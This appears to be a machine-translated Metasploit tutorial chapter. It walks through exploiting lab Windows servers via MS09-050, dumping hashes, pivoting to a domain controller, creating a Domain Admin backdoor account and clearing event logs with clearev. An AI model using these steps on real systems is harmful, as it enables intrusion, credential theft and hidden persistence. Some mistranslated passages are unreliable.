# 三、利用工具（Pwnage）

我们从这一章的有趣内容开始：**管理**！对于那些不知道的人来说，**pwn**是黑客说的“拥有”的方式。如果你已经被 pwned，你的系统已经被“拥有”。当你完全破坏服务器时，你就拥有了它。利用是拥有或破坏机器的过程。到目前为止，我们通过收集目标的公共信息和扫描目标网络的漏洞来收集目标的信息。我们现在准备好进攻了。

> *“是的，我刚刚在 3 分钟内完成了您的 Windows 服务器。”*

为了发动攻击，我们将在本章学习以下内容：

*   使用 Metasploit 框架利用 Windows 操作系统
*   使用高级封装外形而不仅仅是漏洞扫描
*   利用 pivot 利用分段网络

# 选择合适的时间和工具

Black Hats 会选择最繁忙的时间访问您的网络，并尽可能地缓慢、安静地进行操作。他们将尽量保持在正常运行的噪音下。是的，那时有更多的人关注网络，但是一个聪明的黑客知道，如果他们速度慢且安静，流量大就是一个很好的掩护。如果你对目标公司的工作流程和人员配备有很好的了解，你可能会选择在人员稀少的时刻进行攻击，比如周末或节假日。这通常在小公司更有效。

如果您是安全操作人员，并且正在测试自己的网络，那么这不是一个好主意。在你的休息时间进行测试——最好是 CEO 睡觉的时候。如果在测试过程中发生任何事故，可以在 CEO 醒着的第二天之前修复并正常运行。在测试期间，攻击通常不会导致系统无法修复，但某些攻击有时会挂起服务或完全挂起系统，直至需要重新启动。某些漏洞攻击的全部目的是将**拒绝服务**（**拒绝服务**）攻击服务或系统。我们不认为这些是真正的剥削。是的，您攻击了系统并使其脱机；然而，你还没有穿透机器。你的攻击成功了，但你没有成功。真正的坏人不会使用 DoS 攻击。他们想进入并窃取或复制您网络中的所有数据。服务下降引起了 IT 员工的注意。如果你想闯进来，这不是一件好事。然而，如果你正在从另一台机器中过滤数据或攻击另一台主机，它可能被用作转移注意力的手段。

DoS 工具也被认为是漏洞利用，因为它们在系统上的工作方式与漏洞利用相同。DoS 挂起系统。为了获得访问权限，利用漏洞还可能使系统挂起足够长的时间，以便利用漏洞注入某种类型的代码来获得访问权限。基本上，你让机器变傻了足够长的时间来建立连接。当您的攻击工具失败时，它可能看起来就像 DoS 攻击。如果您有选择的话，最好让失败的攻击看起来像是临时拒绝服务，这可能会被误解为源主机上的无辜 NIC 故障，而不是在目标系统上测试攻击代码。

### 提示

**黑客把戏**

无论何时进行测试，在进行测试时，请务必有人或以某种方式重新启动系统的服务。在您开始测试之前，请务必提供联系人信息，以便在出现问题时拨打电话。尽管你可能会尽量保持安静，不让任何东西离线，但你应该始终准备好你的*B*计划。

|   | *“使用 Metasploit 利用 Windows 系统不用担心命令行。”* |   |
|   | -->鲍威尔 |

Metasploit 框架是终极工具包。曾经有一段时间，建造一台钢笔测试机需要几天的时间。每个单独的利用工具必须：

*   追踪研究
*   下载（通过拨号网络连接）
*   源代码编译
*   在你的破解平台上测试

现在，来自 Rapid7 的伟人，推出了 Metasploit 框架。Metasploit 提供了框架中作为插件或函数所需的几乎所有工具。无论您在测试的网络上发现什么操作系统，甚至是什么类型的设备，Metasploit 都可能有一个模块来利用它。我们 90%的工作都是通过 Metasploit 完成的。

# 选择正确的 Metasploit 版本

Metasploit 有两个版本：社区版和专业版。在命令行中，它们都是相同的。专业版的主要功能是一个漂亮的 web 界面和一些报告工具，这些工具将从该界面为您生成报告。您还可以使用一些很好的工具来测试命令行中无法使用的大型网络。其中一个功能是，您可以从导入的漏洞扫描中选择一台或多台机器，而 Pro 版本将自动选择模块并针对目标机器运行这些模块。如果您正在大型网络上工作或正在进行大量测试，请使用专业版本。这是非常值得的钱，你可以很容易地使用你的卡利攻击平台。

对于本书，我们将使用 Kali Linux 附带的社区版本。

*   警告由于美国关于所谓黑客工具的臭名昭著的新法律，卡利不再预装专业版。如果您所在的国家/地区正确，并且希望加载专业版；设置新目录以将 Pro 版本安装到中。制作一个名为`/opt/metasploit-pro`的目录并安装在那里。在安装 pro 版本的过程中，它将正确链接并添加新的 metasploit 命令，以便一切正常工作。记住在 Kali 上保留社区版本。其他 Kali 工具仍将取决于社区安装基础。要升级专业版，请使用 web 界面中的升级部分。
*   提示在命令行中使用 Metasploit 时，“Tab”键将为您完成许多自动完成操作。对于“显示选项”，键入 sh<tab>o<tab>，您将看到这将自动完成命令。这在整个 Metsploit 都有效。</tab></tab>
*   此外，要重复命令，向上箭头键将带您转到以前的命令。这是历史特征。这个功能非常有用。例如，在更改模块和攻击同一台机器时，可以回滚到指定目标“set RHOST 192.168.202.3”的命令。

# 启动金属喷溅

好的，让我们启动 Metasploit。首先，因为 Metasploit 使用客户机/服务器模型，所以我们需要打开 Metasploit 服务。在 Kali 1.x 中，必须在菜单栏中启动 Metasploit 服务器。进入**应用程序****卡利 Linux****系统服务****元软件****社区/专业启动**：

![Starting Metasploit](../Images/image00720.jpeg)

终端窗口将打开，服务将启动。Kali 2 有一个显著的改进，这意味着您只需单击左侧栏或主**应用程序**菜单中的 Metasploit 链接。

![Starting Metasploit](../Images/image00721.jpeg)

Metasploit 使用 PostgreSQL v9.1 数据库服务器。服务启动可能需要几分钟的时间。

![Starting Metasploit](../Images/image00722.jpeg)

服务启动后，键入`msfconsole`启动 Metasploit 控制台。当我们输入`workspace`时，我们可以看到工作区。我们将很快建立一个新的工作区。

### 提示

**黑客提示**

第一次启动 Metasploit 控制台时，它将创建数据库，因此您可以观看 90 秒的 SQL 语言。

当控制台准备就绪时，它将向您展示一只会说话的小母牛（`# cowsay++`向您介绍 Metasploit：

![Starting Metasploit](../Images/image00723.jpeg)

要获取控制台命令列表，请随时键入`help`。

```
msf > help

```

<colgroup><col> <col> <col> <col></colgroup> 
| 

核心命令

 |
| --- |
| **命令** | **说明** | **命令** | **说明** |
| `?` | 帮助菜单 | `previous` | 将之前加载的模块设置为当前模块 |
| `back` | 将从当前上下文移回 | `pushm` | 将模块的活动列表推送到模块堆栈上 |
| `banner` | 展示一个很棒的 Metasploit 横幅 | `quit` | 退出控制台 |
| `cd` | 更改当前的工作目录 | `reload_all` | 从所有定义的模块路径重新加载所有模块 |
| `color` | 切换颜色 | `rename_job` | 重新命名作业 |
| `connect` | 与主机通信 | `resource` | 运行存储在文件中的命令 |
| `edit` | 使用$VISUAL 或$EDITOR 编辑当前模块 | `route` | 通过会话路由流量 |
| `exit` | 退出控制台 | `save` | 保存活动数据存储 |
| `get` | 获取上下文特定变量的值 | `search` | 搜索模块名称和说明 |
| `getg` | 获取全局变量的值 | `sessions` | 转储会话列表并显示有关会话的信息 |
| `go_pro` | 启动 Metasploit web GUI | `set` | 将上下文特定变量设置为值 |
| `grep` | Greps 另一个命令的输出 | `setg` | 将全局变量设置为一个值 |
| `help` | 启动帮助菜单 | `show` | 显示给定类型的模块或所有模块 |
| `info` | 显示关于一个或多个模块的信息 | `sleep` | 在指定的秒数内不执行任何操作 |
| `irb` | 将置于 irb 脚本模式 | `spool` | 将控制台输出写入文件以及屏幕 |
| `jobs` | 显示并管理作业 | `threads` | 查看并操纵背景线程 |
| `kill` | 杀死一份工作 | `unload` | 卸载一个框架插件 |
| `load` | 加载一个框架插件 | `unset` | 取消设置一个或多个上下文特定变量 |
| `loadpath` | 搜索并从路径加载模块 | `unsetg` | 取消设置一个或多个全局变量 |
| `makerc` | 将自开始输入的命令保存到文件中 | `use` | 按名称选择模块 |
| `popm` | 将最新模块从堆栈中弹出并使其处于活动状态 | `version` | 显示框架和控制台库版本号 |

<colgroup><col> <col> <col> <col></colgroup> 
| 

数据库后端命令

 |
| --- |
| 

命令

 | 

描述

 | 

命令

 | 

描述

 |
| --- | --- | --- | --- |
| `creds` | 列出数据库中的所有凭证 | `db_status` | 显示当前数据库状态 |
| `db_connect` | 将连接到现有数据库 | `hosts` | 列出数据库中的所有主机 |
| `db_disconnect` | 断开与当前数据库实例的连接 | `loot` | 列出数据库中的所有战利品 |
| `db_export` | 导出包含数据库内容的文件 | `notes` | 列出数据库中的所有注释 |
| `db_import` | 导入扫描结果文件（自动检测文件类型） | `services` | 列出数据库中的所有服务 |
| `db_nmap` | 执行 nmap 并自动记录输出 | `vulns` | 列出数据库中的所有漏洞 |
| `db_rebuild_cache` | 重建数据库存储模块缓存 | `workspace` | 在数据库工作区之间切换 |

要获取有关单个命令的帮助，请键入`help <command>`；下面的屏幕截图显示了两个示例，显示了`use`和`hosts`命令帮助。我们有一个清单，显示了它的用法以及与该命令一起工作的任何标志的说明。

![Starting Metasploit](../Images/image00724.jpeg)

# 创建工作区来组织您的攻击

首先，我们需要设置一个工作区。工作区对保持测试有序有很大帮助。工作区保存您收集的所有测试数据，包括在利用漏洞期间收集的任何登录凭据和收集的任何系统数据。最好将测试数据分开，以便以后可以比较上一次测试的结果。我们将建立一个名为`TestCompany-int-20150402`的项目。这是一种命名项目的方法，`<client-name>-[ int (internal) | ext (external) ]-<start-date (unix-style)>`这将帮助你在 6 个月的时间里记住哪个测试是什么。

要创建新的项目类型，请执行以下操作：

```
workspace -a TestCompany-int-20150402

```

要输入工作区类型，请执行以下操作：

```
workspace TestCompany-int-20150402

```

![Creating workspaces to organize your attack](../Images/image00725.jpeg)

请注意，在进入工作区并再次键入 workspace 命令后，星号已经移动了`TestCompany`项目。星号显示工作区。

我们可以使用扫描应用程序生成的 xml 文件中的`db_import` 命令将数据从扫描拉入工作区。所有扫描应用程序将其数据导出为 xml，Metasploit 将自动从主要扫描应用程序导入数据。

![Creating workspaces to organize your attack](../Images/image00726.jpeg)

您还可以使用 Nmap 导入主机、服务和网络信息，并使用`msfconsole's``db_nmap`命令将 Nmap 的输出直接导入 Metasploit。此命令适用于所有正常的`nmap`命令行标志。`db_`通知 Metasploit 导入数据。仅运行`nmap`将运行扫描，但不会将任何数据导入 Metasploit；您将只看到命令的输出。

我们已经运行了命令：

```
db_nmap -A -sV -O 192.168.202.0/24

```

`-A`命令`nmap`运行所有测试。 `-sV`命令`nmap`记录任何正在运行的服务的版本控制。`-O`命令`nmap`记录任何正在运行的主机的操作系统。我们将看到运行扫描的输出；然而，这些数据也在数据库中收集。然后，我们还可以通过运行`hosts`和`services`命令来查看导入后的结果。

![Creating workspaces to organize your attack](../Images/image00727.jpeg)

# 使用主机和服务命令

接下来我们看到运行以下命令的结果：

```
hosts
services

```

通过`hosts`命令，我们可以获得所有活动 IP 地址、所有收集的机器名称以及机器操作系统的列表。通过运行`services`命令，我们可以得到网络上所有正在运行的服务及其相关 IP 地址的列表。您可以使用`-c`标志从命令中更改表列表。以下屏幕截图显示了这些命令的帮助信息。

![Using the hosts and services commands](../Images/image00728.jpeg)

# 使用高级足迹

漏洞扫描仅提供最低限度的信息。在实际攻击机器时，您需要执行一些深层次探测，以检查有用的信息泄漏。从扫描中，我们可以看到 Windows 域控制器和 Windows 文件服务器都运行 Windows 2008 Server。两者都运行 SMB/NetBIOS 服务。在这种情况下，一个好的第一次攻击向量是利用 SMB/NETBIOS 服务，这是已知的可利用的弱点。那么，让我们仔细看看这些服务。

在我们进一步研究目标机器的足迹之前，这里是关于 notes 的注释。特别是在进行手动探测时，记得记录下你的输出和发现。复制/粘贴是你最好的朋友。漏洞扫描几乎总是生成漂亮的报告，所有数据都在一个地方编译。手动探测不会，所以这取决于您。我们强烈建议使用 KeepNote，这是我们在[第 1 章](01.html#aid-F8902 "Chapter 1. Sharpening the Saw")中首次访问的*磨锯*，因为您将收集大量数据，稍后可能需要这些数据。不要相信你的记忆。就像一个侦探在调查一个案子一样，把一切都记录下来。

以下是我们测试的正常布局。KeepNote 最好的地方是框架非常开放，可以随意设置和使用。此设置使用：

*   客户公司的文件夹，可在其中找到：
*   用于一般项目注释的页面
*   目标文件夹
*   每个被测试系统的单独页面

KeepNote 甚至还附带了一个很好的导出到 HTML 的工具，在这个工具中，你可以导出你的笔记，这样别人就可以在没有 KeepNote 的情况下阅读它们。

![Using advanced footprinting](../Images/image00729.jpeg)

1.  First, we use `nbtscan` to get a quick look at the domain name or workgroup name and any other basic NetBIOS data we'll need. So, let's open a new terminal window and run this command:

    ```
    nbtscan -v -s : 192.168.202.0/24

    ```

    `-v`标志用于详细模式，将打印所有收集的信息。`-s`：标志将用冒号分隔数据。

    ![Using advanced footprinting](../Images/image00730.jpeg)

    我们可以看到域名是`LAB1`，所有机器都是该域名的成员；我们以后需要这些信息。

2.  Back in the `msf` console window, run the command:

    ```
    msf> search smb

    ```

    我们得到了与 SMB 服务相关的所有模块的列表。这是扫描、探测、漏洞利用和漏洞利用后模块的列表。首先，我们将检查是否存在公开的共享，然后检查来宾帐户是否在计算机上拥有任何权限。我们选择`auxiliary/scanner/smb/smb_enumshares`。点击*Ctrl*+*Shift*+*C*可以选择并复制文本；您可以使用*Ctrl*+*Shift*+*V*进行粘贴。

    ![Using advanced footprinting](../Images/image00731.jpeg)

3.  To use the module, run the command:

    ```
    use auxiliary/scanner/smb/smb_enumshares

    ```

    这将使您进入模块。我们使用此模块的以下方式是使用所有模块的正常方式。不同模块的配置可能不同，但是进入模块和配置的操作是相同的。

    `use`命令是访问任何模块的方式。如果要退出模块，请键入没有选项或目标信息的`back`命令。

4.  By running the command,

    ```
    info auxiliary/scanner/smb/smb_enumshares

    ```

    我们可以查看有关模块的信息和帮助信息，而无需实际进入模块。

    ![Using advanced footprinting](../Images/image00732.jpeg)

5.  After entering the module type,

    ```
    show options

    ```

    它将显示模块的可用参数。有了这个模块，我们需要设置主机来探测域名和用户帐户。通过在 SMBUser 帐户为空的情况下运行此模块，您可以检查`Everyone`组是否具有任何权限。设置为`Guest`将检查来宾账号是否启用；但是，它还将检查 Everyone 组。

    注意，我们有一个参数 RHOSTS；这是设置要探测的主机的参数。这是一个扫描仪模块，因此该参数是复数的，将接受网络范围或单个主机。

6.  We set the configuration by typing

    ```
    set RHOSTS 192.168.202.3
    set SMBDomain LAB1
    set SMBUser Guest
    show options

    ```

    `show options`命令将再次启动配置，以便您可以在运行扫描之前进行检查。

## 解释扫描结果并根据结果进行构建

下面，我们看到通过键入

```
exploit

```

我们看到扫描失败了，但它确实给了我们有价值的信息。首先，由于扫描失败，我们现在知道没有对 Everyone 组开放的股票。通过响应，我们可以判断该服务处于活动状态，但拒绝允许连接。第二，我们可以看到，事实上，来宾帐户是禁用的。有人可能会说，这没有带来任何结果，但从这一点上，我们确定该服务处于活动状态，并接受来自我们 IP 地址的连接，这是我们下一步行动的重要信息。

![Interpreting the scan and building on the result](../Images/image00733.jpeg)

SMB 服务使用 RPC 管道传输信息，RPC 服务有时会泄漏系统信息；那么，让我们看看我们得到了什么。为此，我们将使用 DCERPC 管道审计员模块。

```
use auxiliary/scanner/smb/pipe_dcerpc_auditor
show options

```

我们可以在下面的屏幕截图中看到模块配置。我们可以使用箭头键指向前面模块中的配置，并设置 SMBDomain 和 RHOSTS 设置。

```
set SMBDomain LAB1
set RHOSTS 192.168.202.3
show options
exploit

```

![Interpreting the scan and building on the result](../Images/image00734.jpeg)

我们的 SMB 服务似乎锁定得很好。我们马上就知道了。

## 利用较差的补丁管理

查看之前完成的扫描，我们可以看出机器已经有一段时间没有进行修补了。另外，从我们的网络布局来看，我们知道这是一台 Windows 2008 服务器，因此排除了使用早于 2008 年的漏洞攻击。我们还可以从探测中看出服务器配置中存在薄弱环节。我们需要一个能绕过这些障碍的漏洞。

选择正确的漏洞需要经验和反复试验。并非所有的工作和一些需要一个以上的尝试来利用一个系统。如果一开始你没有成功，不要放弃。平均 Windows 安装有几个可利用的漏洞。

我们已经选择了`exploit/windows/smb/ms09_050_smb2_negotiate_func_index`。此漏洞利用越界调用攻击 SMB 请求验证功能，并建立**MeterMeter**会话。MeterMeter 是一个 Metasploit 外壳，它与远程连接一起工作，并有许多工具可用于获得提升的权限、收集哈希和系统信息。在提示下，键入`help`查看以下命令：

![Exploiting poor patch management](../Images/image00735.jpeg)

祝贺您已在目标计算机上打开会话。现在事情变得有趣了。由于您在目标计算机上打开了一个会话，因此您可以找到只有在计算机内部才能找到的详细信息：

1.  First we need to elevate our access by typing `getsystem.` We see that we got a positive result, so we now have SYSTEM access to this server. To get further information, type `sysinfo` to find out about the specific build of Windows Server OS and the general architecture of the hardware. In this case, the OS is a 32-bit version, which is becoming more and more unusual. The x86 designation tells you that. Now, just for fun, type in `ipconfig` to find out how many network cards are present on the machine and to which subnets they are defined.

    ![Exploiting poor patch management](../Images/image00736.jpeg)

2.  Next, we type `hashdump`, and now we have the hashes of all the local accounts. Note the 500 after the name Administrator; this is the User Identifier (UID). The Administrator UID is always 500 on a Windows machine. If the Administrator's account name has been changed, you can still see which account the local administrator is by this number. If we copy and paste these accounts and hashes into a text file and then import it into the **Johnny Cracking Tool,** we will soon have the passwords.

    ![Exploiting poor patch management](../Images/image00737.jpeg)

3.  Next, let's upload a file. Now this could be a virus, a trojan, or any sort of file at all. You can now upload anything, including more tools for exploitation. Since you now own it, you can upload and install anything you like. Here, as part of the testing procedure, we're going to upload a text file called `youvebeenpwned.txt` into the `C:\Windows\System32\` directory. In testing, we used this sort of benign file as evidence that we have been there and had the ability to upload files to an area to which only users with administrative privileges can write files.

    ![Exploiting poor patch management](../Images/image00738.jpeg)

### 提示

**黑客提示**

我们第一次尝试上载文件时失败了。在目的地，我们将其键入为`c:\windows\system32`；我们使用了反斜杠，正如您在输出中看到的，斜杠被省略，所有文本一起运行。MeterMeter 是 Linux 命令行，因此必须使用正斜杠`/`。第二次尝试使用正斜杠，因此文件已成功上载到系统。

在 Windows 机器上，我们现在可以在`Systems32`目录中看到该文件。这将用于证明服务器易受攻击的证据。

![Exploiting poor patch management](../Images/image00739.jpeg)

那不是很容易吗？

## 查明是否有人在家

继续前进，我们需要看看目前是否有人登录。在一次真正的黑客攻击中，仅仅制造大量噪音或大声喊叫“有人在吗？”会适得其反，攻击者会一直等到没有人在。我们可以在下面看到，我们有一个用户使用 active desktop 登录。

Metasploit 中的某些漏洞利用会在漏洞利用期间打开桌面；如果是这种情况，您将在**会话**表下看到漏洞攻击会话号。全零还告诉我们，active desktop 实际上是计算机上的用户。

![Finding out whether anyone is home](../Images/image00740.jpeg)

到目前为止，在本次会议期间，我们已经提升了权限，上传了一个文件，并检查是否有人在观看。我们现在需要的是一个 shell 来运行我们上传的文件（如果它是令人讨厌的东西，而我们是一个真正的攻击者）。

要在拥有的 Windows 计算机上创建命令 shell，请键入`shell`。现在远程计算机上有一个 shell。注意：在下面的示例中，列出当前目录内容的 Linux`ls`命令不起作用，因为您现在在 Windows 中。

![Finding out whether anyone is home](../Images/image00741.jpeg)

# 使用枢轴

有时我们需要从一个网络跳到另一个网络，有时是因为网络隔离，或者可能是为了跳过防火墙。这被称为**枢轴**。操作系统之间的数据透视不同，因此您需要使用的 Metasploit 模块可能不同。在这里，我们将从一台 Windows 机器开始。在隔离网络上，我们需要攻击的机器是在两个网络上都有接口的机器。有时，这可以在您的网络探测器中找到，从 RPC 或 SNMP 探测器收集的泄漏系统信息中可以找到。此外，有时机器名会泄露此信息。如果有一台名为**JumpBox**的机器，那就是您想要的。

### 提示

**黑客提示**

只要有可能，删除诸如命名您的机器`Jumpbox-2`、`Mail-1`、`HTTP-2003`等详细信息，以及其他此类透明名称。管理员非常熟悉的良好命名约定可以帮助您使破解者的生活更加困难。

下面，我们看到了我们攻击的布局。即使你不是一个“视觉化的人”，你也必须考虑到你用来测试网络的方法应该有很好的文件记录给客户或在场。稍后，当您测试了 200 个网络，并被要求返回并检查其中一个进行季度检查时，它也将对您有所帮助。草图不一定非得有什么花哨的东西，但只要看一下它，它就会给你很多信息。

下面的绘图是使用 Solidworks DraftSight 完成的，它是一个类似于 AutoCAD 的程序。如果您没有工程背景，CAD 可能不是您的最佳选择。如果您想要一个适用于 Linux 发行版的简单图表创建应用程序，您可以在几秒钟内获得 Dia。它未安装在默认的 Kali 实例上。要获取副本，请键入：

```
apt-get -y install dia

```

它简单易用。

## 将网络映射到枢轴

我们从**10.100.0.0/24**网络进入。您也可以将用于防火墙出口。如果**BO-SRV2**的地址是一个公共地址，这也可以工作，即使它受到防火墙的保护，NAT 仍然允许利用漏洞和枢轴。防火墙将处理翻译，您将在**10.100.0.0/24**网络上。

下图显示了防火墙的横截面。通过比较这两个图，您可以看到漏洞利用路径基本相同，您只是通过另一个设备。实际攻击仍在**BO-SRV2**上。

![Mapping the network to pivot](../Images/image00742.jpeg)

# 创建攻击路径

下面是我们将用于此演示的实际攻击路径的示意图。我们已经在**10.100.0.0/24**网络上，准备转向**192.168.202.0/24**。

一旦我们利用了**BO-SRV2**，我们就可以使用**192.168.202.0/24**网络上的接口利用该网络上的主机。有些工具如`db_nmap`无法通过这种枢轴工作。命令`db_nmap`正在调用一个外部程序`nmap,`来执行该工作，该外部应用程序的输出被导入数据库。Nmap 不是 Metasploit 模块。我们使用的枢轴仅允许 Metasploit 模块通过该枢轴运行。别担心。Metasploit 自带了许多自己的发现工具，这些工具通过这个轴心可以很好地工作。

![Creating the attack path](../Images/image00743.jpeg)

您可以看到这种方法的一种方式是，它基于我们从**BO-SVR2**机器的原始利用中获得的信息。在这种情况下，我们可以在该服务器上设置后门，以便随时回来进一步利用网络。别担心！我们将在后面的章节中介绍这一点。我们将使用上次利用**BO-SRV2**的相同漏洞，但这次攻击来自**10.100.0.0/24**网络。我们可以在下面的屏幕截图中看到，我们已经利用了这台机器，现在有了一个 MeterMeter 外壳：

![Creating the attack path](../Images/image00744.jpeg)

## 目标上的抓取系统

接下来，我们确保我们可以访问系统并检查系统信息。然后，我们进入机器上的外壳：

```
getsystem
sysinfo
shell

```

之后，您将运行 shell：

```
ipconfig

```

我们现在可以看到接口和网络的网络信息。我们知道网络的最大大小（`255.255.255.0`和两个网络的网关地址。我们现在知道路由器的 IP 地址是什么（`10.100.0.1`和`192.168.202.1`，并且可能假设这些也是防火墙。现在我们知道即将发生的事情。

![Grabbing system on the target](../Images/image00745.jpeg)

一旦你将这些信息复制到笔记中，你现在就需要离开 Windows 外壳。现在的逻辑动作是键入：

```
exit

```

这将使您返回 MeterMeter 提示符。我们现在需要摆脱这个外壳，建立通往新网络的路线。要退出此外壳而不关闭连接，请键入：

```
background

```

### 提示

**黑客提示**

如果您忘记并在此时键入`exit`，您将关闭 MeterMeter 外壳，但它也将关闭利用漏洞会话。我们想让会议继续下去。

要在会话中检查，请键入：

```
sessions -l

```

这将列出正在运行的会话。您将看到**会话 ID 号**，稍后设置路由时需要此号码。这里，`ID`是`1`。

![Grabbing system on the target](../Images/image00746.jpeg)

## 设置路线

接下来，我们需要建立一条到网络的路由。Metaploit 有自己的内置路由功能。`route`命令的工作原理与 Linux 中的 route 命令非常相似，但是您在 Metasploit 中建立的路由只在 Metasploit 中工作。

要设置路线，请键入：

```
route add 192.168.202.0 255.255.255.0 1

```

这会将路由添加到网络掩码为`255.255.255.0`的`192.168.202.0`网络中，最后的 1 通过会话 1 路由该流量。请注意，当我们只键入`route`时，该命令将失败并提供帮助信息。为确保路线已设置，请键入：

```
route print

```

这将在 Metasploit 中打印路由信息。如我们所见，我们有一条使用`Session 1`作为网关的路线。

![Setting Up the route](../Images/image00747.jpeg)

## 探索内部网络

我们仍然需要在**192.168.202.0/24**网络上找到一些机器。是的，我们知道路由器在哪里，但我们仍然应该四处寻找一些低垂的果实。防火墙和路由器通常都经过很好的加固，当它们被戳得太多时，有时会发出警报。一戳测试默认路由器密码就足够了，然后继续往下看。

我们知道这个网络上很可能有 Windows 服务器。这是一个后端网络，它们很可能是内部服务器——所有真正有价值的数据所在的服务器。我们发现 BO-SRV2 正在使用 SMB/NetBIOS。很可能内部网络中的所有服务器都在通过 NetBIOS 使用 SMB。NetBIOS 只喜欢分发网络和系统信息，因此我们将探索 NetBIOS 服务，看看能找到什么。

我们将使用模块`auxiliary/scanner/discovery/udp_probe`。我们使用 UDP 探测，因为我们知道 NetBIOS 将响应并返回信息。此外，IDS 系统接收 UDP 的可能性小于它们注意到意外 TCP 流量的可能性。正常工作时，NetBIOS 消息会在网络上产生大量噪音，噪音如此之大，以至于 IDS 系统会压制这些噪音，并完全忽略这些流量。我们好奇的小探针可能会被完全忽视。

### 提示

**黑客提示**

Metasploit 还附带了一个`udp_sweep`模块。这一个在枢轴上不能很好地工作，所以一定要使用探针而不是扫描。

![Exploring the inner network](../Images/image00748.jpeg)

上面，我们已经将我们的`RHOSTS`网络设置为`192.168.202.0/24`，并将`LHOST`设置为我们的本地地址`10.100.0.196`。然后我们输入`run`我们得到结果。从返回字符串中，我们可以看到网络上有两台服务器和网关路由器。其中一台服务器就是我们所在的服务器，我们可以看到`192.168.202.3`的内部地址。我们还看到一个新服务器**BO-DC1**，地址为`192.168.202.2`。我们还可以看到，两者都是 LAB1 域的成员。嗯。一个名为 DC1 的服务器。你不认为这可能是域控制器，是吗？

我们知道`exploit exploit/windows/smb/ms09_050_smb2_negotiate_func_index`在第一台服务器上工作，所以很可能在**BO-DC1**上工作。系统以组为单位进行修补，因此漏洞最有可能在其他机器上工作。

让我们有一个域控制器！

如果您不在模块中，请再次加载 ms09-050 漏洞：

```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

```

我们将`RHOST`设定为：

```
set RHOST 192.168.202.2
exploit

```

六羟甲基三聚氰胺六甲醚！什么也没发生，只是坐在那里然后失败了。我们可以运行`sessions -l`并查看是否没有会话。问题在哪里？当我们查看配置时，我们看到我们正在使用`10.100.0.0`网络上的地址。

![Exploring the inner network](../Images/image00749.jpeg)

让我们将其更改为我们正在使用的 pwned 主机，看看会发生什么：

```
set LHOSTS 192.168.202.3
exploit

```

砰！我们进去了！是的，我们借用了**BO-SRV2**上的接口并通过它进行了利用。我们现在有一个`session2`在用米计外壳运行。通过输入`sysinfo`，我们看到这是我们控制的**BO-DC1**。现在，是时候控制整个网络了。我们有域控制器，所以我们真的可以大肆破坏。

现在我们在这台机器上，我们可能会发现它与其他网段是双宿或多宿的。我们可以从这台机器转向第三个或第四个网络。如果新发现的网段中有一个也是多主机的，我们就可以在这个客户机网络中获得一个很好的主机集合。如果你曾经想知道大型网络是如何深入到其内部网络的，这就是为什么。

此外，在使用 pivots 时，如果在收集完所有战利品后，您希望在没有任何痕迹的情况下退出，则最后要运行的命令是**clearev**。这将清除计算机上的所有事件日志。后退时，在每个枢轴点进行此操作，您的路径不太可能是可追踪的。

![Exploring the inner network](../Images/image00750.jpeg)

好的，我们进去了。

首先，让我们收集一些散列：

```
hashdump

```

破解域控制器的有趣之处在于，您只需破解一个哈希文件即可获得本地管理员和域管理员。我们有所有域帐户的哈希值，甚至还有域上机器帐户的哈希值。

微软将域帐户与本地帐户无缝集成，真是太好了。将 LDAP 服务帐户存储在它们自己的加密存储中会更安全。

请确保将这些内容复制/粘贴到您的项目注释中，以便以后脱机破解：

![Exploring the inner network](../Images/image00751.jpeg)

## 滥用 Windows 网络使用命令

破解密码非常耗时。这就是为什么在具有高资源级别的系统上使该进程离线通常是一个好主意。你不必等到开膛手约翰破解了所有密码。我们有系统访问权限，所以我们只需设置一个知道密码的用户帐户。我们将使用 Windows**NET 使用**命令在 shell 中执行此操作。

### 从命令行添加 Windows 用户

这种鲜为人知的添加用户的方法可以让您作为 Windows 系统管理员的生活更轻松。通过 GUI 界面添加用户速度较慢，但这是大多数 Windows 管理员知道如何执行此任务的唯一方法：

1.  在 MeterMeter 提示符内，如我们之前所做的，键入：

    ```
    shell

    ```

2.  Run the following commands after getting a shell on the system:

    ```
    net user evilhacker lamepassword /add

    ```

    请注意，我们从 SMB 服务收到一个错误，我们的密码不够强，因此让我们再试一次。毕竟，一个好的密码会让我们远离。正当

    ```
    net user evilhacker LamePassword1 /add

    ```

    成功

3.  Make a Local Administrator group for her:

    ```
    net localgroup "Administrators" evilhacker /add

    ```

    成功

4.  Add her to the Domain Administrator group:

    ```
    net group "Domain Admins" evilhacker /add

    ```

    成功

5.  要退出 Windows 外壳，请键入：

    ```
    exit

    ```

我们现在已经建立了一个在整个域中拥有完全权限的帐户。现在我们有了无限的访问权限，我们可以退出我们的漏洞攻击，退出 Metasploit——如果您愿意的话。这种创建帐户的方法对于添加新用户的常规系统管理任务也很有用。您可以编写一个批处理文件，从带有名称和“首次使用”密码列表的文本文件中添加无限数量的用户。

![Adding a Windows user from the command line](../Images/image00752.jpeg)

在我们离开**BO-DC1**之前，我们需要在**BO-DC1**上为我们的会议做背景介绍。通过键入以下内容，我们可以看到两个会话正在运行：

```
sessions -l

```

![Adding a Windows user from the command line](../Images/image00753.jpeg)

要终止所有会话，请键入：

```
sessions -K

```

这将杀死所有正在运行的会话。这次我没有清除事件日志。

![Adding a Windows user from the command line](../Images/image00754.jpeg)

由于我们仍然驻留在 10.100.0.0 网络上，我们需要先登录 BO-SRV2。那么，让我们将 RDP 导入主机。我们将使用全新的管理员帐户。要在 Kali 上使用 RDP，您将使用**rdesktop**。Rdesktop 实际上没有 GUI 前端，因此从命令行类型来看：

```
rdesktop 10.100.0.189

```

将出现桌面登录屏幕。您将在屏幕截图中注意到该用户被列为`evilhacker`。这将在域上失败。因此，既然我们知道 Windows 域是 LAB1，请输入`LAB1\evilhacker`和您的蹩脚（但复杂）密码。

![Adding a Windows user from the command line](../Images/image00755.jpeg)

我们进去了！如下图所示，我们有一个名为`evilhacker`的 Windows 域管理用户，我们可以做任何我们想做的事情。我们可以选择一个不太显眼的名称，以防对域用户进行审计。对于渗透测试，我们真的希望很明显，测试客户机需要解决一个严重的问题。

![Adding a Windows user from the command line](../Images/image00756.jpeg)

现在让我们转到域控制器。在 BO-SRV2 上打开 Windows RDP 客户端并登录域控制器。

![Adding a Windows user from the command line](../Images/image00757.jpeg)

我们在域控制器中！

![Adding a Windows user from the command line](../Images/image00758.jpeg)

如果我们打开 Active Directory 用户和计算机 mmc 面板，我们可以看到我们设置的`evilhacker`帐户，我们可以完全控制所有事情。

